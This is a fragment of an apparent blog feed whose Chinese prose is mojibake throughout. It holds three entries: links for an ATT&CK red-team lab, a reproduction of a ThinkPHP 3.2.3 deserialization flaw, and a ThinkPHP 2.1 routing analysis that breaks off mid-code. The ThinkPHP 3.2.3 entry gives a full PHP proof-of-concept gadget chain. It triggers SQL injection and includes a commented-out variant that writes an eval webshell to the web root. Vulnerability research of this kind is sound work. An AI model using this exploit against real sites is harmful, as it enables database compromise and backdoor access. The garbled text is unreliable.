      <link href="/2022/05/08/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2022/05/08/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>ç”±äºé”®ç›˜çš„ç¼˜æ•…ï¼Œå†™äº†å¥½å‡ å¤©çš„åšå®¢æ²¡æœ‰äº†<br>è¿™é‡Œæä¾›æˆ‘çš„å‚è€ƒåšå®¢</p><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/">ç¯å¢ƒæ­å»º</a></p><p><a href="https://www.yongsheng.site/2021/03/22/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/">å¤§ä½¬åšå®¢</a><br><a href="https://jishuin.proginn.com/p/763bfbd2e94e">æ·»åŠ è·¯ç”±</a><br><a href="https://blog.csdn.net/zzlx123/article/details/103661662">æœ¨é©¬ç”ŸæˆåŠåˆ©ç”¨</a><br><a href="https://cloud.tencent.com/developer/article/1853985">è¿›ç¨‹è¿ç§»</a><br><a href="https://blog.csdn.net/m0_53087192/article/details/112707016">kiwiçš„ç®€å•ä½¿ç”¨</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp3.2.3ååºåˆ—åŒ–æ¼æ´å¤ç°</title>
      <link href="/2022/05/07/Thinkphp3.2.3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/05/07/Thinkphp3.2.3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é¦–å…ˆå…¨å±€æœç´¢ destructï¼Œ è¿™é‡Œçš„ $this-&gt;img å¯æ§ï¼Œå¯ä»¥åˆ©ç”¨å…¶æ¥è°ƒç”¨ å…¶ä»–ç±»çš„destroy() æ–¹æ³•ï¼Œæˆ–è€…å¯ä»¥ç”¨çš„call() æ–¹æ³•ï¼Œ__call() æ–¹æ³•å¹¶æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„<br><img src="https://img-blog.csdnimg.cn/a48d15617c7b4ef68298ba4426f9de87.png"><br>é‚£å°±å»æ‰¾ destroy() æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/9ca44d705f4646c4ad67e984cfa33b34.png"><br>æ³¨æ„è¿™é‡Œï¼Œdestroy() æ˜¯æœ‰å‚æ•°çš„ï¼Œè€Œæˆ‘ä»¬è°ƒç”¨çš„æ—¶å€™æ²¡æœ‰ä¼ å‚ï¼Œè¿™åœ¨php5ä¸­æ˜¯å¯ä»¥çš„ï¼Œåªå‘å‡ºè­¦å‘Šï¼Œä½†è¿˜æ˜¯ä¼šæ‰§è¡Œã€‚</p><p>ä½†æ˜¯åœ¨php7 é‡Œé¢å°±ä¼šæŠ¥å‡ºé”™è¯¯ï¼Œä¸ä¼šæ‰§è¡Œã€‚</p><p>æ‰€ä»¥æ¼æ´éœ€è¦ç”¨php5çš„ç¯å¢ƒã€‚<br>ç»§ç»­å¯»æ‰¾å¯åˆ©ç”¨çš„delete()æ–¹æ³•ã€‚</p><p>åœ¨Think\Modelç±»å³å…¶ç»§æ‰¿ç±»é‡Œï¼Œå¯ä»¥æ‰¾åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œè¿˜æœ‰æ•°æ®åº“é©±åŠ¨ç±»ä¸­ä¹Ÿæœ‰è¿™ä¸ªæ–¹æ³•çš„ï¼Œthinkphp3çš„æ•°æ®åº“æ¨¡å‹ç±»çš„æœ€ç»ˆæ˜¯ä¼šè°ƒç”¨åˆ°æ•°æ®åº“é©±åŠ¨ç±»ä¸­çš„ã€‚</p><p>å…ˆçœ‹Modelç±»ä¸­ã€‚<br><img src="https://img-blog.csdnimg.cn/99915fec3498488abfad11ece63b0a16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>æ³¨æ„ï¼Œå¦‚æœ$options[â€˜whereâ€™]ä¸ºç©ºï¼Œä¼šreturnæ‰<br><img src="https://img-blog.csdnimg.cn/9aed181c0ff54634bb8f9a3b5cafe717.png"><br>è·Ÿè¿› getPK() æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/f4020abc8f0c41c98a4ad38d39ea547b.png"><br>$pkå¯æ§ $this-&gt;dataå¯æ§<br>æœ€ç»ˆå»é©±åŠ¨ç±»çš„å…¥å£åœ¨è¿™é‡Œ<br><img src="https://img-blog.csdnimg.cn/3e8a953802dd4c648d5d3d799affecc9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸‹é¢æ˜¯é©±åŠ¨ç±»çš„deleteæ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/ad424b8009c949ab8351ee512655718f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>ä¸€å¼€å§‹è°ƒç”¨Modelç±»çš„deleteæ–¹æ³•çš„æ—¶å€™ï¼Œä¼ å…¥çš„å‚æ•°æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;sessionName.<span class="variable">$sessID</span></span><br></pre></td></tr></table></figure><p>è€Œåé¢æˆ‘ä»¬æ‰§è¡Œçš„æ—¶å€™æ˜¯ä¾é æ•°ç»„çš„ï¼Œæ•°ç»„æ˜¯ä¸å¯ä»¥ç”¨ å­—ç¬¦ä¸²è¿æ¥ç¬¦çš„ã€‚å‚æ•°æ§åˆ¶ä¸å¯ä»¥åˆ©ç”¨$this-&gt;sessionNameã€‚</p><p>ä½†æ˜¯å¯ä»¥ä»¤å…¶ä¸ºç©ºï¼ˆæœ¬æ¥å°±æ˜¯ç©ºï¼‰ï¼Œä¼šè¿›å…¥Model ç±»ä¸­çš„deleteæ–¹æ³•ä¸­çš„ç¬¬ä¸€ä¸ªifåˆ†æ”¯ï¼Œç„¶åå†æ¬¡è°ƒç”¨deleteæ–¹æ³•ï¼ŒæŠŠ$this-&gt; $data[thisâˆ’&gt;data[pk] ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè¿™æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼</p><p>è·Ÿè¿›driverç±»ä¸­çš„execute() æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/7a6dd7afd1be44c68f1e9027ac48494c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>è·Ÿè¿› initConnect() æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/5e9650a0dedb4b649ec1b2f66f423ae6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›connect<br><img src="https://img-blog.csdnimg.cn/23244ce33cbc484f817777486c15de78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>æ•°æ®åº“çš„è¿æ¥æ—¶é€šè¿‡ PDO æ¥å®ç°çš„ï¼Œå¯ä»¥å †å æ³¨å…¥(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true ) éœ€è¦æŒ‡å®šè¿™ä¸ªé…ç½®ã€‚</p><p>è¿™é‡Œæ§åˆ¶ $this-&gt;config æ¥è¿æ¥æ•°æ®åº“ã€‚</p><p>driverç±»æ—¶æŠ½è±¡ç±»ï¼Œæˆ‘ä»¬éœ€è¦ç”¨mysqlç±»æ¥å®ä¾‹åŒ–ã€‚</p><p>åˆ°è¿™é‡Œä¸€æ¡ååºåˆ—åŒ–è§¦å‘sqlæ³¨å…¥çš„é“¾å­å°±åšå¥½äº†ã€‚</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;sessionName=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle= <span class="keyword">new</span> Model();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>]=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;pk=<span class="string">&#x27;jiang&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk]=<span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;table&quot;</span>=&gt;<span class="string">&quot;mysql.user where 1=updatexml(1,concat(0x7e,user()),1)#&quot;</span>,</span><br><span class="line">            <span class="comment">//&quot;table&quot; =&gt; &quot;mysql.user where 1=1;select &#x27;<span class="meta">&lt;?php</span> eval(\$_POST[1]);<span class="meta">?&gt;</span>&#x27; into outfile &#x27;/var/www/html/shell.php&#x27;;#&quot;,//å †å æ‰“å¼€æ‰èƒ½ç”¨</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;where&quot;</span>=&gt;<span class="string">&quot;1=1&quot;</span></span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> Mysql();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PDO</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> ;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options= <span class="keyword">array</span>(</span><br><span class="line">        PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>, <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        <span class="comment">//PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true,//å †å æ‰“å¼€</span></span><br><span class="line">        );   </span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;config= <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Imagick()));</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp2.1ä»£ç æ‰§è¡ŒåŠè·¯ç”±åˆ†æ</title>
      <link href="/2022/05/07/Thinkphp2.1%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90/"/>
      <url>/2022/05/07/Thinkphp2.1%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>Dispatcher.class.phpè¿™ä¸ªæ–‡ä»¶ä¸­æ˜¯urlè·¯ç”±ï¼Œç”±äºç¬¬ä¸€æ¬¡æ­£å¼çœ‹è·¯ç”±é‚£å—ï¼Œæ‰€ä»¥å°±ä»å¤´å¼€å§‹ä¸€è¡Œä¸€è¡Œçœ‹æŠŠã€‚<br>é¦–å…ˆæ˜¯dispatchå‡½æ•°<br>æ˜¯37è¡Œåˆ°140è¡Œ<br>è¿™ä¸ªå‡½æ•°æ˜¯åšæ˜ å°„ç”¨ï¼ŒæŠŠurlæ˜ å°„åˆ°æ§åˆ¶å™¨å¯¹æˆ‘ä»¬æ¥è¯´ç®—æ˜¯æœ€é‡è¦çš„ä¸€å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$urlMode</span>  =  C(<span class="string">&#x27;URL_MODEL&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$urlMode</span> == URL_REWRITE ) &#123;</span><br><span class="line">    <span class="comment">//å½“å‰é¡¹ç›®åœ°å€</span></span><br><span class="line">    <span class="variable">$url</span>    =   dirname(_PHP_FILE_);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span> == <span class="string">&#x27;/&#x27;</span> || <span class="variable">$url</span> == <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">        <span class="variable">$url</span>    =   <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$urlMode</span> == URL_COMPAT)&#123;</span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,_PHP_FILE_.<span class="string">&#x27;?&#x27;</span>.C(<span class="string">&#x27;VAR_PATHINFO&#x27;</span>).<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//å½“å‰é¡¹ç›®åœ°å€</span></span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,_PHP_FILE_);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹å°±è°ƒç”¨äº†ä¸€ä¸ªåå«Cçš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"><span class="variable">$name</span>=<span class="literal">null</span>, <span class="variable">$value</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$_config</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">// æ— å‚æ•°æ—¶è·å–æ‰€æœ‰</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$name</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_config</span>;</span><br><span class="line">    <span class="comment">// ä¼˜å…ˆæ‰§è¡Œè®¾ç½®è·å–æˆ–èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$name</span> = strtolower(<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">if</span> (is_null(<span class="variable">$value</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_config</span>[<span class="variable">$name</span>]) ? <span class="variable">$_config</span>[<span class="variable">$name</span>] : <span class="literal">null</span>;</span><br><span class="line">            <span class="variable">$_config</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// äºŒç»´æ•°ç»„è®¾ç½®å’Œè·å–æ”¯æŒ</span></span><br><span class="line">        <span class="variable">$name</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$name</span>[<span class="number">0</span>] = strtolower(<span class="variable">$name</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$value</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]]) ? <span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]] : <span class="literal">null</span>;</span><br><span class="line">        <span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]] = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ‰¹é‡è®¾ç½®</span></span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$name</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_config</span> = array_merge(<span class="variable">$_config</span>, array_change_key_case(<span class="variable">$name</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// é¿å…éæ³•å‚æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œè·å–å¤„ç†ä»¥åŠè¿‡æ»¤çš„å‡½æ•°<br>è€ŒURL_MODELæ˜¯ä¸€ä¸ªå¸¸é‡è¡¨ç¤ºurlçš„å››ç§æ¨¡å¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="string">&#x27;URL_MODEL&#x27;</span>      =&gt; <span class="number">1</span>,       <span class="comment">// URLè®¿é—®æ¨¡å¼,å¯é€‰å‚æ•°0ã€1ã€2ã€3,ä»£è¡¨ä»¥ä¸‹å››ç§æ¨¡å¼ï¼š</span></span><br><span class="line"><span class="comment">// 0 (æ™®é€šæ¨¡å¼); 1 (PATHINFO æ¨¡å¼); 2 (REWRITE  æ¨¡å¼); 3 (å…¼å®¹æ¨¡å¼)  é»˜è®¤ä¸ºPATHINFO æ¨¡å¼ï¼Œæä¾›æœ€å¥½çš„ç”¨æˆ·ä½“éªŒå’ŒSEOæ”¯æŒ</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.cxyzjd.com/article/u012382791/50845351">å››ç§æ¨¡å¼</a><br>æ ¹æ®æ¨¡å¼çš„ä¸åŒurlæ ¼å¼ä¹Ÿæœ‰ä¸åŒã€‚è¿™é‡Œåˆ°æ²¡æœ‰ä»€ä¹ˆå¤ªå¤šå¯è¯´çš„ã€‚æ¥ä¸‹æ¥æ˜¯ä¸€é•¿ä¸²å¯¹äºŒçº§åŸŸåè¿›è¡Œå¤„ç†çš„ï¼Œä¹Ÿå…ˆè·³è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span>(!<span class="built_in">self</span>::routerCheck())&#123;   <span class="comment">// æ£€æµ‹è·¯ç”±è§„åˆ™ å¦‚æœæ²¡æœ‰åˆ™æŒ‰é»˜è®¤è§„åˆ™è°ƒåº¦URL</span></span><br><span class="line">        <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">        <span class="variable">$var</span>  =  <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]))&#123;</span><br><span class="line">            <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(C(<span class="string">&#x27;APP_GROUP_DENY&#x27;</span>) &amp;&amp; in_array(strtolower(<span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]),explode(<span 